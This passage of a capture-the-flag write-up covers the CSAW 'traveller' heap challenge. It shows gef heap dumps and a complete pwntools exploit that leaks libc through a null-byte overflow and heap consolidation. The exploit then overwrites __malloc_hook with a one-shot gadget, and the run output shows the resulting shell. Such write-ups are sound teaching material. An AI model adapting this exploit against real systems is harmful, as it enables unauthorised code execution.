+0x235b7a0:    0x3636363636363636    0x7fbb12b0000a
+0x235b7b0:    0x3838383838383838    0x3838383838383838
+0x235b7c0:    0x3838383838383838    0x3838383838383838
+0x235b7d0:    0x3838383838383838    0x3838383838383838
+0x235b7e0:    0x3838383838383838    0x3838383838383838
+0x235b7f0:    0x3838383838383838    0x3838383838383838
+0x235b800:    0x3838383838383838    0x3838383838383838
+0x235b810:    0x3838383838383838    0x3838383838383838
+0x235b820:    0x3838383838383838    0x181
+0x235b830:    0x7fbb12b01b78    0x7fbb12b01b78
+0x235b840:    0x3838383838383838    0x3838383838383838
+0x235b850:    0x3838383838383838    0x3838383838383838
+0x235b860:    0x3838383838383838    0x3838383838383838
+0x235b870:    0x3838383838383838    0x3838383838383838
+0x235b880:    0x3838383838383838    0x3838383838383838
+0x235b890:    0x3838383838383838    0x3838383838383838
+0x235b8a0:    0x250    0x100
+0x235b8b0:    0x3030303030303030    0x3030303030303030
+0x235b8c0:    0x3030303030303030    0x3030303030303030
+0x235b8d0:    0x3030303030303030    0x3030303030303030
+0x235b8e0:    0x3030303030303030    0x3030303030303030
+0x235b8f0:    0x3030303030303030    0x3030303030303030
+0x235b900:    0x3030303030303030    0x3030303030303030
+0x235b910:    0x3030303030303030    0x3030303030303030
+0x235b920:    0x3030303030303030    0x3030303030303030
+0x235b930:    0x3030303030303030    0x3030303030303030
+0x235b940:    0x3030303030303030    0x3030303030303030
+0x235b950:    0x3030303030303030    0x3030303030303030
+0x235b960:    0x3030303030303030    0x3030303030303030
+0x235b970:    0x3030303030303030    0x3030303030303030
+0x235b980:    0x3030303030303030    0x3030303030303030
+0x235b990:    0x3030303030303030    0x3030303030303030
+0x235b9a0:    0x180    0x230
+0x235b9b0:    0xa    0x0
+0x235b9c0:    0x0    0x211
+0x235b9d0:    0x3333333333333333    0xa
+0x235b9e0:    0x0    0x0
+0x235b9f0:    0x0    0x0
+0x235ba00:    0x0    0x0
+0x235ba10:    0x0    0x0
+0x235ba20:    0x0    0x0
+0x235ba30:    0x0    0x0
+0x235ba40:    0x0    0x0
+0x235ba50:    0x0    0x0
+0x235ba60:    0x0    0x0
+0x235ba70:    0x0    0x0
+0x235ba80:    0x0    0x0
+0x235ba90:    0x0    0x0
+0x235baa0:    0x0    0x0
+0x235bab0:    0x0    0x0
+0x235bac0:    0x0    0x0
+0x235bad0:    0x0    0x0
+0x235bae0:    0x0    0x0
+0x235baf0:    0x0    0x0
+gef➤  x/g 0x7fbb12b01b10
+0x7fbb12b01b10 <__malloc_hook>:    0x0
+```
+
+Now we can just overwrite the malloc hook with a oneshot gadget:
+
+```
+gef➤  x/g 0x7fbb12b01b10
+0x7fbb12b01b10 <__malloc_hook>:    0x7fbb1282e147
+```
+
+After that, it is just a matter of calling `malloc` and getting a shell!
+
+## Exploit
+
+Putting it all together, we have the following exploit:
+
+```
+from pwn import *
+
+#target = remote("pwn.chal.csaw.io", 1003)
+target = process("./traveller", env = {"LD_PRELOAD":"./libc-2.23.so"})
+#gdb.attach(target)
+
+libc = ELF("libc-2.23.so")
+
+def pl():
+    print target.recvuntil(">")
+
+'''
+1. 0x80
+2. 0x110
+3. 0x128
+4. 0x150
+5. 0x200
+'''
+def add(size, content):
+    pl()
+    target.sendline("1")
+    #pl()
+    target.sendline(str(size))
+    #print target.recvuntil("Destination")
+    target.sendline(content)
+
+def edit(index, content):
+    pl()
+    target.sendline("2")
+    #pl()
+    target.sendline(str(index))
+    raw_input()
+    #print target.recvuntil("Destination")
+    target.sendline(content)
+
+def delete(index):
+    pl()
+    target.sendline("3")
+    #pl()
+    target.sendline(str(index))
+    #print target.recvuntil("Destination")
+
+def show(index):
+    pl()
+    target.sendline("4")
+    #pl()
+    target.sendline(str(index))
+    #print target.recvuntil("Destination")
+
+# allocate / free some chunks to get 0x10 byte chunks out of the way
+add(1, "x"*8)
+add(1, "x"*8)
+add(1, "x"*8)
+add(1, "x"*8)
+
+delete(0)
+delete(0)
+delete(0)
+delete(0)
+
+# Allocate our four chunks which will be right next to each other in memory
+add(2, "0"*8)# 0
+add(3, "1"*8)# 1
+add(2, "2"*8)# 2
+add(5, "3"*8)# 3
+
+
+# Free the first chunk
+delete(0)# 0
+
+# Edit the second chunk, execute null byte overflow against third
+edit(1, "8"*0x120 + p64(0x250))# 1
+
+# Setup fake chunk in the third chunk to pass malloc checks
+edit(2, "0"*0xf0 + p64(0) + p64(0x231))# 2
+
+# free the third chunk, cause the heap consolidation
+delete(2)# 2
+
+# Bring the start of the unsorted bin up to our first chunk, which we can still write to
+add(2, "4"*8)
+
+# Get the libc infoleak
+
+pl()
+pl()
+pl()
+pl()
+pl()
+pl()
+pl()
+pl()
+pl()
+pl()
+pl()
+
+target.sendline("4")
+target.sendline("1")
+print target.recvuntil(">")
+
+leak = target.recvline().strip("\n").strip("\x20")
+leak = u64(leak + "\x00"*(8 - len(leak)))
+libcBase = leak - 0x3c4b78
+
+print "libcBase: " + hex(libcBase)
+
+# Add chunks to get 0x10 byte chunk overlapping with our first chunk
+
+add(1, "5"*8)
+
+add(1, "6"*8)
+
+# Overwrite ptr of 0x10 byte chunk with that of the malloc hook
+edit(1, p64(libcBase + libc.symbols["__malloc_hook"]))
+
+'''
+0x45216 execve("/bin/sh", rsp+0x30, environ)
+constraints:
+  rax == NULL
+
+0x4526a execve("/bin/sh", rsp+0x30, environ)
+constraints:
+  [rsp+0x30] == NULL
+
+0xf02a4 execve("/bin/sh", rsp+0x50, environ)
+constraints:
+  [rsp+0x50] == NULL
+
+0xf1147 execve("/bin/sh", rsp+0x70, environ)
+constraints:
+  [rsp+0x70] == NULL
+
+'''
+
+# Overwrite malloc hook chunk with oneshot gadget
+edit(4, p64(libcBase + 0xf1147))
+
+# Call malloc to get a shell
+add(1, "g0ttem_b0yz")
+
+# Enjoy your shell!
+target.interactive()
+```
+
+When we run it (this exploit was ran on `Ubuntu 16.04`):
+
+```
+$    python exploit.py
+[+] Starting local process './traveller': pid 15765
+[*] '/home/guyinatuxedo/Desktop/traveler/libc-2.23.so'
+    Arch:     amd64-64-little
+    RELRO:    Partial RELRO
+    Stack:    Canary found
+    NX:       NX enabled
+    PIE:      PIE enabled
+
+Hello! Welcome to trip management system.
+0x7ffeba94a67c
+
+Choose an option:
+
+1. Add a trip
+2. Change a trip
+3. Delete a trip
+4. Check a trip
+>
+ Adding new trips...
+Choose a Distance:
+1. 0x80
+2. 0x110
+3. 0x128
+4. 0x150
+5. 0x200
+>
+ Destination: Trip 0 added.
+
+1. Add a trip
+2. Change a trip
+3. Delete a trip
+4. Check a trip
+>
+ Adding new trips...
+Choose a Distance:
+1. 0x80
+2. 0x110
+3. 0x128
+4. 0x150
+5. 0x200
+>
+ Destination: Trip 1 added.
+
+1. Add a trip
+2. Change a trip
+3. Delete a trip
+4. Check a trip
+>
+ Adding new trips...
+Choose a Distance:
+1. 0x80
+2. 0x110
+3. 0x128
+4. 0x150
+5. 0x200
+>
+ Destination: Trip 2 added.
+
+1. Add a trip
+2. Change a trip
+3. Delete a trip
+4. Check a trip
+>
+ Adding new trips...
+Choose a Distance:
+1. 0x80
+2. 0x110
+3. 0x128
+4. 0x150
+5. 0x200
+>
+ Destination: Trip 3 added.
+
+1. Add a trip
+2. Change a trip
+3. Delete a trip
+4. Check a trip
+>
+ Which trip you want to delete:
+1. Add a trip
+2. Change a trip
+3. Delete a trip
+4. Check a trip
+>
+ Which trip you want to delete:
+1. Add a trip
+2. Change a trip
+3. Delete a trip
+4. Check a trip
+>
+ Which trip you want to delete:
+1. Add a trip
+2. Change a trip
+3. Delete a trip
+4. Check a trip
+>
+ Which trip you want to delete:
+1. Add a trip
+2. Change a trip
+3. Delete a trip
+4. Check a trip
+>
+ Adding new trips...
+Choose a Distance:
+1. 0x80
+2. 0x110
+3. 0x128
+4. 0x150
+5. 0x200
+>
+w
+ Destination: Trip 0 added.
+
+1. Add a trip
+2. Change a trip
+3. Delete a trip
+4. Check a trip
+>
+w
+ Adding new trips...
+Choose a Distance:
+1. 0x80
+2. 0x110
+3. 0x128
+4. 0x150
+5. 0x200
+>
+ Destination: Trip 1 added.
+
+1. Add a trip
+2. Change a trip
+3. Delete a trip
+4. Check a trip
+>
+ Adding new trips...
+Choose a Distance:
+1. 0x80
+2. 0x110
+3. 0x128
+4. 0x150
+5. 0x200
+>
+ Destination: Trip 2 added.
+
+1. Add a trip
+2. Change a trip
+3. Delete a trip
+4. Check a trip
+>
+ Adding new trips...
+Choose a Distance:
+1. 0x80
+2. 0x110
+3. 0x128
+4. 0x150
+5. 0x200
+>
+ Destination: Trip 3 added.
+
+1. Add a trip
+2. Change a trip
+3. Delete a trip
+4. Check a trip
+>
+ Which trip you want to delete:
+1. Add a trip
+2. Change a trip
+3. Delete a trip
+4. Check a trip
+>
+ Update trip:
+1. Add a trip
+2. Change a trip
+3. Delete a trip
+4. Check a trip
+>
+ 
+1. Add a trip
+2. Change a trip
+3. Delete a trip
+4. Check a trip
+>
+ Update trip:
+1. Add a trip
+2. Change a trip
+3. Delete a trip
+4. Check a trip
+>
+ Which trip you want to delete:
+1. Add a trip
+2. Change a trip
+3. Delete a trip
+4. Check a trip
+>
+ Adding new trips...
+Choose a Distance:
+1. 0x80
+2. 0x110
+3. 0x128
+4. 0x150
+5. 0x200
+>
+ Destination: Trip 2 added.
+
+1. Add a trip
+2. Change a trip
+3. Delete a trip
+4. Check a trip
+>
+ Which trip you want to view?
+>
+libcBase: 0x7f86714bb000
+
+1. Add a trip
+2. Change a trip
+3. Delete a trip
+4. Check a trip
+>
+ Adding new trips...
+Choose a Distance:
+1. 0x80
+2. 0x110
+3. 0x128
+4. 0x150
+5. 0x200
+>
+ Destination: Trip 3 added.
+
+1. Add a trip
+2. Change a trip
+3. Delete a trip
+4. Check a trip
+>
+w
+ Adding new trips...
+Choose a Distance:
+1. 0x80
+2. 0x110
+3. 0x128
+4. 0x150
+5. 0x200
+>
+w
+ Destination: Trip 4 added.
+
+1. Add a trip
+2. Change a trip
+3. Delete a trip
+4. Check a trip
+>
+[*] Switching to interactive mode
+ Update trip:
+1. Add a trip
+2. Change a trip
+3. Delete a trip
+4. Check a trip
+> Update trip:
+1. Add a trip
+2. Change a trip
+3. Delete a trip
+4. Check a trip
+> Adding new trips...
+UH\x89�H�� �}�� \x11@: 1: 1: not found
+UH\x89�H�� �}�� \x11@: 2: g0ttem_b0yz: not found
+$ w
+ 11:28:42 up  2:41,  1 user,  load average: 0.02, 0.02, 0.00
+USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
+guyinatu tty7     :0               Mon20    2days 35.61s  0.19s /sbin/upstart --user
+$ ls
+core  exploit.py  libc-2.23.so    solved    traveller
+```
+
+Just like that, we got a shell!
